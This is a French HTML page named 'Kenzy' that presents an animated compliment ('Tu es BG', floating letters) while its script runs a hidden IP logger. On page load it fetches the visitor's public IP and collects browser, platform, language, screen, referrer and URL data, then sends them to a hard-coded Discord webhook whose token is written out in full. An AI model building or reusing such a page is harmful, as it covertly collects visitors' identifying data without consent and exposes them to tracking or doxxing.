<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenzy</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            padding: 20px;
        }

        .background-animation {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            animation: float 15s infinite linear;
        }

        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 60px 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 800px;
            width: 100%;
            animation: fadeIn 1s ease-out;
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                45deg,
                transparent 30%,
                rgba(255, 255, 255, 0.1) 50%,
                transparent 70%
            );
            animation: shine 3s infinite linear;
            z-index: -1;
        }

        .main-text {
            font-size: 6rem;
            font-weight: 900;
            background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: gradientShift 4s ease infinite, pulse 2s ease-in-out infinite;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            display: inline-block;
        }

        .main-text::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 4px;
            background: linear-gradient(90deg, #ff6b6b, #feca57);
            animation: expandWidth 2s ease-in-out infinite alternate;
        }

        .sub-text {
            font-size: 2rem;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 30px;
            animation: slideUp 1s ease-out 0.5s both;
            font-weight: 300;
            letter-spacing: 1px;
        }

        .highlight {
            font-weight: 700;
            color: #feca57;
            text-shadow: 0 0 10px rgba(254, 202, 87, 0.5);
        }

        .floating-letters {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 40px;
            flex-wrap: wrap;
        }

        .floating-letter {
            font-size: 3rem;
            font-weight: 900;
            color: white;
            animation: floatLetter 3s ease-in-out infinite;
            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .loading-dots {
            display: inline-flex;
            gap: 8px;
            margin-top: 30px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: white;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }

        .visitor-info {
            margin-top: 40px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
            animation: fadeIn 2s ease-out 1s both;
            padding: 15px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
            }
        }

        @keyframes floatLetter {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(5deg);
            }
        }

        @keyframes expandWidth {
            from { width: 0; }
            to { width: 100%; }
        }

        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes bounce {
            0%, 80%, 100% { 
                transform: scale(0);
                opacity: 0.5;
            }
            40% { 
                transform: scale(1);
                opacity: 1;
            }
        }

        @media (max-width: 768px) {
            .main-text {
                font-size: 4rem;
            }
            
            .sub-text {
                font-size: 1.5rem;
            }
            
            .floating-letter {
                font-size: 2rem;
            }
            
            .container {
                padding: 40px 20px;
            }
        }

        @media (max-width: 480px) {
            .main-text {
                font-size: 3rem;
            }
            
            .sub-text {
                font-size: 1.2rem;
            }
            
            .floating-letters {
                gap: 10px;
            }
            
            .floating-letter {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="background-animation" id="particles"></div>
    
    <div class="container">
        <h1 class="main-text">Kenzy</h1>
        <div class="sub-text">Tu es <span class="highlight">BG</span></div>
        
        <div class="floating-letters">
            <span class="floating-letter" style="animation-delay: 0s">V</span>
            <span class="floating-letter" style="animation-delay: 0.2s">I</span>
            <span class="floating-letter" style="animation-delay: 0.4s">F</span>
            <span class="floating-letter" style="animation-delay: 0.6s">!</span>
            <span class="floating-letter" style="animation-delay: 0.8s">üî•</span>
        </div>
        
        <div class="loading-dots">
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
        </div>
        
        <div class="visitor-info" id="visitorInfo">
            Chargement des informations...
        </div>
    </div>

    <script>
        // Cr√©er les particules d'animation
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Taille al√©atoire
                const size = Math.random() * 60 + 10;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Position al√©atoire
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                // D√©lai d'animation al√©atoire
                particle.style.animationDelay = `${Math.random() * 15}s`;
                
                particlesContainer.appendChild(particle);
            }
        }

        // R√©cup√©rer l'IP et envoyer au webhook Discord
        async function sendIPToDiscord() {
            const webhookURL = 'https://discord.com/api/webhooks/1458396548776988705/FklNwgLCSIR5qCXLygkEL1fD97Odvec7cotSyfKex1pXN5L10RZJjjUa_OkA1JminH48';
            
            try {
                // R√©cup√©rer l'IP via un service public
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // R√©cup√©rer d'autres infos
                const userAgent = navigator.userAgent;
                const language = navigator.language;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                const referrer = document.referrer || 'Direct';
                
                // Pr√©parer l'embed Discord
                const embed = {
                    embeds: [{
                        title: "Nouvelle visite sur Kenzy",
                        description: "Quelqu'un a visit√© le site",
                        color: 0x00ff00,
                        fields: [
                            {
                                name: "IP",
                                value: `\`${userIP}\``,
                                inline: true
                            },
                            {
                                name: "Navigateur",
                                value: userAgent.substring(0, 50) + '...',
                                inline: false
                            },
                            {
                                name: "Langue",
                                value: language,
                                inline: true
                            },
                            {
                                name: "Plateforme",
                                value: platform,
                                inline: true
                            },
                            {
                                name: "√âcran",
                                value: screenSize,
                                inline: true
                            },
                            {
                                name: "Referrer",
                                value: referrer,
                                inline: false
                            },
                            {
                                name: "URL",
                                value: window.location.href,
                                inline: false
                            }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Logs automatiques - IP supprim√©e apr√®s 24h"
                        }
                    }]
                };
                
                // Envoyer au webhook Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embed)
                });
                
                // Afficher un message pour l'utilisateur
                document.getElementById('visitorInfo').innerHTML = 
                    `‚úÖ Visite enregistr√©e<br><small>Les informations sont automatiquement supprim√©es apr√®s 24h</small>`;
                
                // Enregistrer dans le localStorage pour √©viter trop d'envois
                localStorage.setItem('kenzyVisit', new Date().toISOString());
                
            } catch (error) {
                console.error('Erreur lors de l\'envoi √† Discord:', error);
                document.getElementById('visitorInfo').innerHTML = 
                    `‚ö†Ô∏è Erreur de connexion<br><small>Veuillez rafra√Æchir la page</small>`;
            }
        }

        // V√©rifier si on a d√©j√† envoy√© l'IP r√©cemment
        function shouldSendIP() {
            const lastVisit = localStorage.getItem('kenzyVisit');
            if (!lastVisit) return true;
            
            const lastVisitDate = new Date(lastVisit);
            const now = new Date();
            const hoursSinceLastVisit = (now - lastVisitDate) / (1000 * 60 * 60);
            
            // Renvoyer seulement si la derni√®re visite date de plus de 1 heure
            return hoursSinceLastVisit > 1;
        }

        // Initialiser le site
        document.addEventListener('DOMContentLoaded', () => {
            createParticles();
            
            // Attendre un peu avant d'envoyer l'IP pour que l'utilisateur voie l'animation
            setTimeout(() => {
                if (shouldSendIP()) {
                    sendIPToDiscord();
                } else {
                    document.getElementById('visitorInfo').innerHTML = 
                        `üëã Bon retour sur le site !<br><small>Derni√®re visite il y a moins d'une heure</small>`;
                }
            }, 2000);
            
            // Animation suppl√©mentaire au clic
            document.querySelector('.container').addEventListener('click', () => {
                const container = document.querySelector('.container');
                container.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    container.style.transform = 'scale(1)';
                }, 100);
            });
        });
    </script>
</body>
</html>
